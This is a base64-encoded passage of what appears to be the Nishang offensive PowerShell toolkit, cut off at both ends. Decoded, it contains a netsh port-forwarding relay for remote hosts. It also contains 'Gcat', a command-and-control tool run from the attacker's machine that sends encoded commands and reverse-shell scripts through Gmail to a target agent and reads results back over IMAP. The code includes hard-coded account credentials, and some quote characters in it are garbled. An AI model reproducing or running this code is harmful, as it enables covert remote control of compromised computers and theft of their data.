ydHByb3h5IHNob3cgJFJlbGF5IH0gLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgfQogICAgaWYgKCREZWxldGUpCiAgICB7CiAgICAgICAgI1JlbGF5IGNvbW1hbmRzIGZvciBkZWxldGlvbgogICAgICAgICRWNHRvdjRSZWxheSA9ICJuZXRzaCBpbnRlcmZhY2UgcG9ydHByb3h5IGRlbGV0ZSB2NHRvdjQgbGlzdGVucG9ydD0kTGlzdGVuUG9ydCBsaXN0ZW5hZGRyZXNzPSRMaXN0ZW5BZGRyZXNzIHByb3RvY29sPXRjcCIKICAgICAgICAkVjZ0b1Y0UmVsYXkgPSAibmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBkZWxldGUgdjZ0b3Y0IGxpc3RlbnBvcnQ9JExpc3RlblBvcnQgbGlzdGVuYWRkcmVzcz0kTGlzdGVuQWRkcmVzcyIKICAgICAgICAkVjR0b3Y2UmVsYXkgPSAibmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBkZWxldGUgdjR0b3Y2IGxpc3RlbnBvcnQ9JExpc3RlblBvcnQgbGlzdGVuYWRkcmVzcz0kTGlzdGVuQWRkcmVzcyIKICAgICAgICAkVjZ0b1Y2UmVsYXkgPSAibmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBkZWxldGUgdjZ0b3Y2IGxpc3RlbnBvcnQ9JExpc3RlblBvcnQgbGlzdGVuYWRkcmVzcz0kTGlzdGVuQWRkcmVzcyBwcm90b2NvbD10Y3AiCgogICAgICAgICNDcmVhdGUgYSBzY3JpcHRibG9jayBmb3IgZGVsZXRpbmcgdGhlIHJlbGF5LCBkZXBlbmRpbmcgdXBvbiBpdHMgdHlwZS4KICAgICAgICBzd2l0Y2ggKCRSZWxheSkKICAgICAgICB7ICAgCiAgICAgICAgICAgICJ2NHRvdjQiIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc2JkZWxldGUgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJFY0dG9WNFJlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJEZWxldGluZyB2NHRvdjQgUmVsYXkgd2hpY2ggd2FzIGxpc3RlbmluZyBvbiAkTGlzdGVuQWRkcmVzcywgUG9ydCAkTGlzdGVuUG9ydCBhbmQgY29ubmVjdGluZyB0byAkQ29ubmVjdGFkZHJlc3MsIFBvcnQgJENvbm5lY3Rwb3J0IgogICAgICAgICAgICB9CiAgICAgICAgICAgICJ2NnRvdjQiIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc2JkZWxldGUgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJFY2dG9WNFJlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJEZWxldGluZyB2NnRvdjQgUmVsYXkgd2hpY2ggd2FzIGxpc3RlbmluZyBvbiAkTGlzdGVuQWRkcmVzcywgUG9ydCAkTGlzdGVuUG9ydCBhbmQgY29ubmVjdGluZyB0byAkQ29ubmVjdGFkZHJlc3MsIFBvcnQgJENvbm5lY3Rwb3J0IgogICAgICAgICAgICB9CiAgICAgICAgICAgICJ2NHRvdjYiIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc2JkZWxldGUgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJFY0dG9WNlJlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJEZWxldGluZyB2NHRvdjYgUmVsYXkgd2hpY2ggd2FzIGxpc3RlbmluZyBvbiAkTGlzdGVuQWRkcmVzcywgUG9ydCAkTGlzdGVuUG9ydCBhbmQgY29ubmVjdGluZyB0byAkQ29ubmVjdGFkZHJlc3MsIFBvcnQgJENvbm5lY3Rwb3J0IgogICAgICAgICAgICB9CiAgICAgICAgICAgICJ2NnRvdjYiIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc2JkZWxldGUgPSBbU2NyaXB0QmxvY2tdOjpDcmVhdGUoJFY2dG9WNlJlbGF5KQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJEZWxldGluZyB2NnRvdjYgUmVsYXkgd2hpY2ggd2FzIGxpc3RlbmluZyBvbiAkTGlzdGVuQWRkcmVzcywgUG9ydCAkTGlzdGVuUG9ydCBhbmQgY29ubmVjdGluZyB0byAkQ29ubmVjdGFkZHJlc3MsIFBvcnQgJENvbm5lY3Rwb3J0IgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgCiAgICAgICAgI0V4ZWN1dGUgdGhlIG5ldHNoIGNvbW1hbmQgb24gcmVtb3RlIGNvbXB1dGVyCiAgICAgICAgaWYgKCRDcmVkcykKICAgICAgICB7CiAgICAgICAgICAgIEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkc2JkZWxldGUgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1DcmVkZW50aWFsICRDcmVkcwogICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sge3BhcmFtICgkU0JSZWxheSkgbmV0c2ggaW50ZXJmYWNlIHBvcnRwcm94eSBzaG93ICRTQlJlbGF5IH0gLUFyZ3VtZW50TGlzdCAkUmVsYXkgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lIC1DcmVkZW50aWFsICRDcmVkcwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJHNiZGVsZXRlIC1Db21wdXRlck5hbWUgJENvbXB1dGVyTmFtZQogICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sge25ldHNoIGludGVyZmFjZSBwb3J0cHJveHkgc2hvdyAkUmVsYXkgfSAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICB9CiAgICB9Cn0KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgR2NhdCAtIFVzaW5nIEdtYWlsIGZvciBjb2RlIGV4ZWN1dGlvbiAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIEludm9rZS1QU0djYXQgbmVlZHMgdG8gYmUgcnVuIG9uIGF0dGFja2VyJ3MgbWFjaGluZSAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKZnVuY3Rpb24gSW52b2tlLVBTR2NhdAp7CjwjCi5TWU5PUFNJUwpOaXNoYW5nIHNjcmlwdCB3aGljaCBjYW4gYmUgdXNlZCB0byBzZW5kIGNvbW1hbmRzIGFuZCBzY3JpcHRzIHRvIEdtYWlsIHdoaWNoIGNhbiB0aGVuIGJlIHJ1biBvbiBhIHRhcmdldCB1c2luZyBJbnZva2UtUFNHY2F0QWdlbnQuCgouREVTQ1JJUFRJT04KVGhpcyBzY3JpcHQgaXMgY2FwYWJsZSBvZiBzZW5kaW5nIGNvbW1hbmRzIGFuZC9vciBzY3JpcHRzIHRvIEdtYWlsLiBBIHZhbGlkIEdtYWlsIHVzZXJuYW1lIGFuZCBwYXNzd29yZCBpcyByZXF1aXJlZC4KVGhlIGNvbW1hbmQgaXMgY29tcHJlc3NlZCBhbmQgYmFzZTY0IGVuY29kZWQgYW5kIHNlbnQgdG8gdGhlIEdtYWlsIGFjY291bnQuIE9uIHRoZSB0YXJnZXQsIEludm9rZS1Qc0djYXRBZ2VudCBtdXN0IGJlIGV4ZWN1dGVkCndoaWNoIHdpbGwgcmVhZCB0aGUgbGFzdCBzZW50IGNvbW1hbmQvc2NyaXB0LCBkZWNvZGUgaXQsIGV4ZWN1dGUgaXQgYW5kIHNlbmQgdGhlIG91dHB1dCBiYWNrIHRvIEdtYWlsLgpJbiB0aGUgR21haWwgc2VjdXJpdHkgc2V0dGluZ3Mgb2YgdGhhdCBhY2NvdW50ICJBY2Nlc3MgZm9yIGxlc3Mgc2VjdXJlIGFwcHMiIG11c3QgYmUgdHVybmVkIG9uLiBNYWtlIHN1cmUgdGhhdCB5b3UgdXNlCmEgdGhyb3cgYXdheSBhY2NvdW50LgoKSW4gdGhlIGludGVyYWN0aXZlIG1vZGUsIHRvIGV4ZWN1dGUgYSBzY3JpcHQsIHR5cGUgInNjcmlwdCIgYXQgdGhlIFBzR2NhdCBwcm9tcHQgYW5kIHByb3ZpZGUgZnVsbCBwYXRoIHRvIHRoZSBzY3JpcHQuClRvIHJlYWQgb3V0cHV0LCB0eXBlICJHZXRPdXRwdXQiIGF0IHRoZSBQc0djYXQgcHJvbXB0LgoKQ3VycmVudGx5LCB0aGUgb3V0cHV0IGlzIG5vdCBwcmV0dHkgYXQgYWxsIGFuZCB5b3Ugd2lsbCBzZWUgdGhlIHNjcmlwdCBpbnRlcmFjdGluZyB3aXRoIEdtYWlsIElNQVAuIAoKLlBBUkFNRVRFUiBVc2VybmFtZQpVc2VybmFtZSBvZiB0aGUgR21haWwgYWNjb3VudCB5b3Ugd2FudCB0byB1c2UuIAoKLlBBUkFNRVRFUiBQYXNzd29yZApQYXNzd29yZCBvZiB0aGUgR21haWwgYWNjb3VudCB5b3Ugd2FudCB0byB1c2UuIAoKLlBBUkFNRVRFUiBBZ2VudElECkFnZW50SUQgaXMgY3VycmVudGx5IHVudXNlZCBhbmQgd291bGQgYmUgdXNlZCB3aXRoIG11bHRpcGxlIGFnZW50IHN1cHBvcnQgaW4gZnV0dXJlLiAKCi5QQVJBTUVURVIgUGF5bG9hZApJbiBOb24taW50ZXJhY3RpdmUgbW9kZSwgdGhlIFBvd2VyU2hlbGwgY29tbWFuZCB5b3Ugd2FudCB0byBzZW5kIHRvIHRoZSBHbWFpbCBhY2NvdW50LgoKLlBBUkFNRVRFUiBTY3JpcHRQYXRoCkluIE5vbi1pbnRlcmFjdGl2ZSBtb2RlLCB0aGUgUG93ZXJTaGVsbCBzY3JpcHQgeW91IHdhbnQgdG8gc2VuZCB0byB0aGUgR21haWwgYWNjb3VudC4KCi5QQVJBTUVURVIgTm9uSW50ZXJhY3RpdmUKVXNlIHRoZSBub24taW50ZXJhY3RpdmUgbW9kZS4gRXhlY3V0ZSB0aGUgcHJvdmlkZWQgY29tbWFuZCBvciBwYXlsb2FkIGFuZCBleGl0LgoKLlBBUkFNRVRFUiBHZXRPdXRwdXQKUmV0cmlldmUgbGFzdCBvdXB1dCBmcm9tIEdtYWlsLgoKLkVYQU1QTEUKUFMgPiBJbnZva2UtUFNHY2F0IC1Vc2VybmFtZSBwc2djYXRsaXRlIC1wYXNzd29yZCBwc3Bhc3N3b3JkClVzZSBHZXRPdXRwdXQgdG8gZ2V0IG91dHB1dC4KVXNlIFNjcmlwdCB0byBzcGVjaWZ5IGEgc2NyaXB0LgpQc0djYXQ6IEdldC1Qcm9jZXNzCkNvbW1hbmQgc2VudCB0byBwc2djYXRsaXRlQGdtYWlsLmNvbQoKCkFib3ZlIHNob3dzIGFuIGV4YW1wbGUgd2hlcmUgR2V0LVByb2Nlc3MgaXMgc2VudCB0byBHbWFpbC4KCi5FWEFNUExFClBTID4gSW52b2tlLVBTR2NhdCAtVXNlcm5hbWUgcHNnY2F0bGl0ZSAtcGFzc3dvcmQgcHNwYXNzd29yZApVc2UgR2V0T3V0cHV0IHRvIGdldCBvdXRwdXQuClVzZSBTY3JpcHQgdG8gc3BlY2lmeSBhIHNjcmlwdC4KUHNHY2F0OiBHZXRPdXRwdXQKLS0tLS1Mb3Qgb2YgSU1BUCB0ZXh0LS0tLS0KKiA4IEZFVENIIChCT0RZW1RFWFRdIHs1MjA2fQpTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyAoQlRIU0FtcFBhbFNlcnZpY2UpIFN5c3RlbS5EaWFnbm9zdGljcwouUHJvY2VzcyAoQlRIU1NlY3VyaXR5TWdyKSBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyAoYnRwbGF5ZXJjdApybCkgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgKGNhcGl3cykgU3lzdGVtLkRpYWdub3N0aWNzLlByb2NlcwpzIChjb25ob3N0KSBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyAoY29uaG9zdCkgU3lzdGVtLkRpYWdub3N0aQoKCkFib3ZlIHNob3dzIGhvdyB0byByZXRyaWV2ZSBvdXRwdXQgZnJvbSBHbWFpbC4gTm90ZSB0aGF0IHRoZSBvdXRwdXQgaXMgdWdseSBhbmQgeW91IG1heSBuZWVkIHRvIHJ1biBHZXRPdXRwdXQgZmV3IHRpbWVzCmJlZm9yZSB0aGUgY29tcGxldGUgb3V0cHV0IGlzIHJlYWQuIEFsc28sIHRoZSBJbnZva2UtUHNHY2F0QWdlbnQgbXVzdCBleGVjdXRlIHRoZSBjb21tYW5kIGJlZm9yZSBhbiBvdXRwdXQgY291bGQgYmUgcmV0cmlldmVkLgoKCi5FWEFNUExFClBTID4gSW52b2tlLVBTR2NhdCAtVXNlcm5hbWUgcHNnY2F0bGl0ZSAtcGFzc3dvcmQgcHNwYXNzd29yZApVc2UgR2V0T3V0cHV0IHRvIGdldCBvdXRwdXQuClVzZSBTY3JpcHQgdG8gc3BlY2lmeSBhIHNjcmlwdC4KUHNHY2F0OiBzY3JpcHQKUHJvdmlkZSBjb21wbGV0ZSBwYXRoIHRvIHRoZSBQb3dlclNoZWxsIHNjcmlwdC46IEM6XHRlc3RccmV2ZXJzZV9wb3dlcnNoZWxsLnBzMQpDb21tYW5kIHNlbnQgdG8gcHNnY2F0bGl0ZUBnbWFpbC5jb20KVXNlIEdldE91dHB1dCB0byBnZXQgb3V0cHV0LgoKClVzZSBhYm92ZSB0byBzZW5kIGEgUG93ZXJTaGVsbCBzY3JpcHQgdG8gdGhlIEdtYWlsIGFjY291bnQuIFNjcmlwdCBleGVjdXRpb24gaXMgbm90IHZlcnkgcmVsaWFibGUgcmlnaHQgbm93IGFuZCB5b3UgbWF5IHNlZQp0aGUgYWdlbnQgc3RydWdnbGluZyB0byBwdWxsIGEgYmlnIGVuY29kZWQgc2NyaXB0LiBBbHNvLCBtYWtlIHN1cmUgdGhhdCB0aGUgZnVuY3Rpb24gY2FsbCBmb3Igc2NyaXB0IGlzIGRvbmUgZnJvbSB0aGUKc2NyaXB0IGl0c2VsZi4KCi5FWEFNUExFClBTID4gSW52b2tlLVBTR2NhdCAtVXNlcm5hbWUgcHNnY2F0bGl0ZSAtcGFzc3dvcmQgcHNwYXNzd29yZCAtUGF5bG9hZCBHZXQtU2VydmljZSAtTm9uSW50ZXJhY3RpdmUKU2VuZCBhIGNvbW1hbmQgdG8gdGhlIEdtYWlsIGFjY291bnQgd2l0aG91dCBhbnkgaW50ZXJhY3Rpb24uIAoKLkVYQU1QTEUKUFMgPiBJbnZva2UtUFNHY2F0IC1Vc2VybmFtZSBwc2djYXRsaXRlIC1wYXNzd29yZCBwc3Bhc3N3b3JkIC1TY3JpcHRQYXRoIEM6XHRlc3RccmV2ZXJzZV9wb3dlcnNoZWxsLnBzMSAtTm9uSW50ZXJhY3RpdmUKU2VuZCBhIHNjcmlwdCB0byB0aGUgR21haWwgYWNjb3VudCB3aXRob3V0IGFueSBpbnRlcmFjdGlvbi4KCi5FWEFNUExFClBTID4gSW52b2tlLVBTR2NhdCAtVXNlcm5hbWUgcHNnY2F0bGl0ZSAtcGFzc3dvcmQgcHNwYXNzd29yZCAtR2V0T3V0cHV0CkdldCBvdXRwdXQgZnJvbSB0aGUgZ21haWwgYWNjb3VudC4KCi5MSU5LCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTUvMDQvcGlsbGFnZS10aGUtdmlsbGFnZS1wb3dlcnNoZWxsLXZlcnNpb24uaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwojPiAgICAgIAogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWU9IkludGVyYWN0aXZlIildIFBhcmFtKAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJJbnRlcmFjdGl2ZSIpXQogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9Ik5vbkludGVyYWN0aXZlIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlcm5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IkludGVyYWN0aXZlIildCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iTm9uSW50ZXJhY3RpdmUiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXNzd29yZCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iSW50ZXJhY3RpdmUiKV0KICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJOb25JbnRlcmFjdGl2ZSIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFnZW50SUQsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iTm9uSW50ZXJhY3RpdmUiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXlsb2FkLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJOb25JbnRlcmFjdGl2ZSIpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNjcmlwdFBhdGgsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlLCBQYXJhbWV0ZXJTZXROYW1lPSJOb25JbnRlcmFjdGl2ZSIpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5vbkludGVyYWN0aXZlLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkR2V0T3V0cHV0CgogICAgKQogICAgIyRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAiU2lsZW50bHlDb250aW51ZSIKCiAgICBmdW5jdGlvbiBTZW5kQ29tbWFuZCAoJFBheWxvYWQsICRVc2VybmFtZSwgJFBhc3N3b3JkKQogICAgewogICAgICAgIAogICAgICAgIHRyeSAKICAgICAgICB7CiAgICAgICAgICAgICRtcyA9IE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtCiAgICAgICAgICAgICRhY3Rpb24gPSBbSU8uQ29tcHJlc3Npb24uQ29tcHJlc3Npb25Nb2RlXTo6Q29tcHJlc3MKICAgICAgICAgICAgJGNzID0gTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtICgkbXMsJGFjdGlvbikKICAgICAgICAgICAgJHN3ID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIgKCRjcywgW1RleHQuRW5jb2RpbmddOjpBU0NJSSkKICAgICAgICAgICAgJFBheWxvYWQgfCBGb3JFYWNoLU9iamVjdCB7JHN3LldyaXRlTGluZSgkXyl9CiAgICAgICAgICAgICRzdy5DbG9zZSgpCiAgICAKICAgICAgICAgICAgIyBCYXNlNjQgZW5jb2RlIHN0cmVhbQogICAgICAgICAgICAkQ29tcHJlc3NlZCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJG1zLlRvQXJyYXkoKSkKICAgIAogICAgICAgICAgICAjaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8xMjUyMzM1L3NlbmQtbWFpbC12aWEtZ21haWwtd2l0aC1wb3dlcnNoZWxsLXYycy1zZW5kLW1haWxtZXNzYWdlCiAgICAgICAgICAgICRzbXRwc2VydmVyID0gw6LigqzFk3NtdHAuZ21haWwuY29tw6LigqwKICAgICAgICAgICAgJG1zZyA9IG5ldy1vYmplY3QgTmV0Lk1haWwuTWFpbE1lc3NhZ2UKICAgICAgICAgICAgJHNtdHAgPSBuZXctb2JqZWN0IE5ldC5NYWlsLlNtdHBDbGllbnQoJHNtdHBTZXJ2ZXIgKQogICAgICAgICAgICAkc210cC5FbmFibGVTc2wgPSAkVHJ1ZQogICAgICAgICAgICAkc210cC5DcmVkZW50aWFscyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbCjDouKCrMWTJHVzZXJuYW1lw6LigqwsIMOi4oKsxZMkcGFzc3dvcmTDouKCrCk7IAogICAgICAgICAgICAkbXNnLkZyb20gPSDDouKCrMWTJHVzZXJuYW1lQGdtYWlsLmNvbcOi4oKsCiAgICAgICAgICAgICRtc2cuVG8uQWRkKMOi4oKsJHVzZXJuYW1lQGdtYWlsLmNvbcOi4oKsKQogICAgICAgICAgICAkbXNnLlN1YmplY3QgPSAiQ29tbWFuZCIKICAgICAgICAgICAgJG1zZy5Cb2R5ID0gIiMjIiArICRDb21wcmVzc2VkCiAgICAgICAgICAgICRzbXRwLlNlbmQoJG1zZykKICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJDb21tYW5kIHNlbnQgdG8gJHVzZXJuYW1lQGdtYWlsLmNvbSIKICAgICAgICB9CiAgICAgICAgY2F0Y2ggCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJTb21ldGhpbmcgd2VudCB3cm9uZyEgQ2hlY2sgaWYgVXNlcm5hbWUvUGFzc3dvcmQgYXJlIGNvcnJlY3QgYW5kIHlvdSBjYW4gY29ubmVjdCB0byBnbWFpbCBmcm9tIGluc2VjdXJlIGFwcHMuIiAKICAgICAgICAgICAgV3JpdGUtRXJyb3IgJF8KICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gUmVhZFJlc3BvbnNlCiAgICB7CiAgICAgICAgdHJ5IAogICAgICAgIHsKICAgICAgICAgICAgJHRjcENsaWVudCA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5OZXQuU29ja2V0cy5UY3BDbGllbnQKCiAgICAgICAgICAgICMgQ29ubmVjdCB0byBnbWFpbAogICAgICAgICAgICAkdGNwQ2xpZW50LkNvbm5lY3QoImltYXAuZ21haWwuY29tIiwgOTkzKQoKICAgICAgICAgICAgaWYoJHRjcENsaWVudC5Db25uZWN0ZWQpIAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjIENyZWF0ZSBuZXcgU1NMIFN0cmVhbSBmb3IgdGNwQ2xpZW50CiAgICAgICAgICAgICAgICBbU3lzdGVtLk5ldC5TZWN1cml0eS5Tc2xTdHJlYW1dICRzc2xTdHJlYW0gPSAkdGNwQ2xpZW50LkdldFN0cmVhbSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgQXV0aGVudGljYXRpbmcgYXMgY2xpZW50CiAgICAgICAgICAgICAgICAkc3NsU3RyZWFtLkF1dGhlbnRpY2F0ZUFzQ2xpZW50KCJpbWFwLmdtYWlsLmNvbSIpOwoKICAgICAgICAgICAgICAgIGlmKCRzc2xTdHJlYW0uSXNBdXRoZW50aWNhdGVkKSAKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICMgQXNzc2lnbmVkIHRoZSB3cml0ZXIgdG8gc3RyZWFtCiAgICAgICAgICAgICAgICBbU3lzdGVtLklPLlN0cmVhbVdyaXRlcl0gJHN3ID0gJHNzbHN0cmVhbQoKICAgICAgICAgICAgICAgICMgQXNzaWduZWQgcmVhZGVyIHRvIHN0cmVhbQogICAgICAgICAgICAgICAgW1N5c3RlbS5JTy5TdHJlYW1SZWFkZXJdICRyZWFkZXIgPSAkc3Nsc3RyZWFtCiAgICAgICAgICAgICAgICAkc2NyaXB0OnJlc3VsdCA9ICIiCiAgICAgICAgICAgICAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIKICAgICAgICAgICAgICAgICRtYWlsID0iIgogICAgICAgICAgICAgICAgJHJlc3BvbnNlYnVmZmVyID0gW0FycmF5XTo6Q3JlYXRlSW5zdGFuY2UoImJ5dGUiLCAyMDQ4KQogICAgICAgICAgICAgICAgCgogICAgICAgICAgICAgICAgZnVuY3Rpb24gUmVhZFJlc3BvbnNlICgkY29tbWFuZCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkc2IgPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIKICAgICAgICAgICAgICAgICAgICBpZiAoJGNvbW1hbmQgLW5lICIiKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldEJ5dGVzKCRjb21tYW5kKQogICAgICAgICAgICAgICAgICAgICAgICAkc3NsU3RyZWFtLldyaXRlKCRidWYsIDAsICRidWYuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkc3NsU3RyZWFtLkZsdXNoKCkKICAgICAgICAgICAgICAgICAgICAkYnl0ZXMgPSAkc3NsU3RyZWFtLlJlYWQoJHJlc3BvbnNlYnVmZmVyLCAwLCAyMDQ4KQogICAgICAgICAgICAgICAgICAgICRzdHIgPSAkc2IuQXBwZW5kKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkcmVzcG9uc2VidWZmZXIpKQogICAgICAgICAgICAgICAgICAgICRzYi5Ub1N0cmluZygpCiAgICAgICAgICAgICAgICAgICAgJHRlbXAgPSAkc2IuVG9TdHJpbmcoKSB8IFNlbGVjdC1TdHJpbmcgIlwqIFNFQVJDSCIKICAgICAgICAgICAgICAgICAgICBpZiAoJHRlbXApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkZmV0Y2ggPSAkdGVtcC5Ub1N0cmluZygpIC1zcGxpdCAiXCQiLDIKICAgICAgICAgICAgICAgICAgICAgICAgJHRtcCA9ICRmZXRjaFswXSAtc3BsaXQgIlwqIFNFQVJDSCAiIC1zcGxpdCAiICIgLXJlcGxhY2UgImBuIgogICAgICAgICAgICAgICAgICAgICAgICBbaW50XSRtYWlsID0gJHRtcFstMV0KICAgICAgICAgICAgICAgICAgICAgICAgJGNtZCA9IFJlYWRSZXNwb25zZSgiJCBGRVRDSCAkbWFpbCBCT0RZW1RFWFRdYHJgbiIsICIxIikKICAgICAgICAgICAgICAgICAgICAgICAgJGNtZCAtcmVwbGFjZSAnPScKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBSZWFkUmVzcG9uc2UgIiIKICAgICAgICAgICAgICAgIFJlYWRSZXNwb25zZSAoIiQgTE9HSU4gIiArICJwc2djYXRsaXRlQGdtYWlsLmNvbSIgKyAiICIgKyAicG93ZXJzaGVsbGNoYWJpIiArICIgIGByYG4iKSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICBSZWFkUmVzcG9uc2UoIiQgU0VMRUNUIElOQk9YYHJgbiIpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIFJlYWRSZXNwb25zZSgiJCBTRUFSQ0ggU1VCSkVDVCBgIk91dHB1dGAiYHJgbiIpCiAgICAgICAgICAgICAgICBSZWFkUmVzcG9uc2UoIiQgTE9HT1VUYHJgbiIpICB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICB9IAogICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1FcnJvciAiWW91IHdlcmUgbm90IGF1dGhlbnRpY2F0ZWQuIFF1aXR0aW5nLiIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSAKICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtRXJyb3IgIllvdSBhcmUgbm90IGNvbm5lY3RlZCB0byB0aGUgaG9zdC4gUXVpdHRpbmciCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNhdGNoIAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiU29tZXRoaW5nIHdlbnQgd3JvbmchIENoZWNrIGlmIFVzZXJuYW1lL1Bhc3N3b3JkIGFyZSBjb3JyZWN0LCB5b3UgY2FuIGNvbm5lY3QgdG8gZ21haWwgZnJvbSBpbnNlY3VyZSBhcHBzIGFuZCBpZiB0aGVyZSBpcyBvdXRwdXQgZW1haWwgaW4gdGhlIGluYm94IiAKICAgICAgICAgICAgV3JpdGUtRXJyb3IgJF8KICAgICAgICB9CiAgICB9CgogICAgI0ZvciBvbmx5IHJlYWRpbmcgdGh